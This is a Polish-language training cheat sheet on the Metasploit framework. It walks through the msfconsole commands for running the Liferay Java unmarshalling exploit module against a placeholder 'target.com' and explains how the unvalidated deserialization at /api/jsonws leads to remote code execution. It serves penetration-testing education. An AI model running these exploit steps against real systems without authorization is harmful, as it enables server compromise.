---
title: Metasploit
sidebar_position: 7
tags: [tool, exploitation]
---

> **Jedno zdanie:** Framework do testów penetracyjnych z setkami gotowych exploitów dla znanych CVE w aplikacjach webowych i usługach.

## Kiedy używać

- Exploitowanie znanych CVE w aplikacjach webowych
- Post-eksploitacja (payloady, powłoki)
- Przykład z kontekstu szkolenia: exploit portalu Liferay przez endpoint `/api/jsonws`

## Instalacja

Preinstalowany na Kali Linux. Uruchom konsolę:

```bash
msfconsole
```

## Kluczowe komendy

```bash
# Wybierz moduł exploita
use exploit/multi/http/liferay_java_unmarshalling

# Ustaw cel ataku
set RHOSTS target.com

# Przejrzyj wymagane i opcjonalne opcje
show options

# Uruchom exploit
exploit
# (lub)
run
```

### Typowy przepływ pracy

| Step | Command |
|------|---------|
| Znajdź moduł | `search liferay` |
| Załaduj go | `use exploit/multi/http/liferay_java_unmarshalling` |
| Ustaw cel | `set RHOSTS target.com` |
| Sprawdź konfigurację | `show options` |
| Wykonaj | `exploit` |

:::tip 💡 Pamiętaj
Zawsze uruchamiaj `show options` przed `exploit` — brakujące wymagane pola (RHOSTS, LHOST, port) spowodują ciche niepowodzenie lub błąd modułu.
:::

## Czym jest Liferay?

**Liferay** to platforma portalowa Java open-source używana przez organizacje do budowania wewnętrznych portali i intranetów. Był to konkretny cel wykorzystany podczas szkolenia.

:::warning Podatność Liferay użyta podczas szkolenia
- **Moduł:** `exploit/multi/http/liferay_java_unmarshalling`
- **Punkt wejścia:** `/api/jsonws` — publiczny endpoint JSON web services domyślnie wystawiony
- **Dlaczego działa:** Endpoint deserializuje obiekty Java bez odpowiedniej walidacji. Wysłanie spreparowanego payloadu wyzwala zdalne wykonanie kodu (RCE) na serwerze.
- **Wykrywanie:** Jeśli znajdziesz `/api/jsonws` na celu, sprawdź wersję Liferay i szukaj pasujących modułów Metasploit za pomocą `search liferay`.
:::

```bash
# Odkryj endpointy Liferay
curl https://target.com/api/jsonws

# Szukaj pasujących modułów
msf> search liferay
```
